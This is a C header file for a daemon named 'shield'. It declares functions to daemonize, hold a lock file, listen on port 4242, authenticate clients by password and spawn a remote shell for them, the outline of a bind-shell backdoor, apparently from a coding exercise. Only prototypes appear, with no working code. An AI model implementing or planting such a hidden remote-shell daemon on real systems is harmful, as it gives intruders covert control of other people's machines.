#ifndef SHIELD_H
# define SHIELD_H

# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <unistd.h>
# include <errno.h>
# include <signal.h>
# include <fcntl.h>
# include <sys/file.h>
# include <sys/types.h>
# include <sys/socket.h>
# include <sys/select.h>
# include <sys/wait.h>
# include <arpa/inet.h>
# include <netinet/in.h>

# define MAX_CLIENTS 3
# define BUFFER_SIZE 4242
# define LOCK_PATH "/var/lock/shield.lock"
# define PORT 4242

typedef struct
{
	int lock_fd;
	int listen_fd;
	int client_fds[MAX_CLIENTS];
	int client_authenticated[MAX_CLIENTS];
	int client_count;
	int stop_flag;
} t_shield;

extern volatile sig_atomic_t g_signal;

int		shield_init(t_shield *daemon);
void	shield_destroy(t_shield *daemon);
void	shield_run(t_shield *daemon);

void	setup_signal_handlers(void);
void	signal_handler(int sig);

int		create_lock_file(t_shield *daemon);
void	remove_lock_file(t_shield *daemon);

void	daemonize(t_shield *daemon);
void	setup_socket(t_shield *daemon);

void	allow_connections(t_shield *daemon);
void	close_all_clients(t_shield *daemon);

int		verify_pass(const char *pass);

void	spawn_shell(t_shield *daemon, int client_fd);
void	print_usage(int client_fd);
void	send_cmd_output(const char *cmd, int client_fd);
void	display_prompt(int client_fd);

#endif
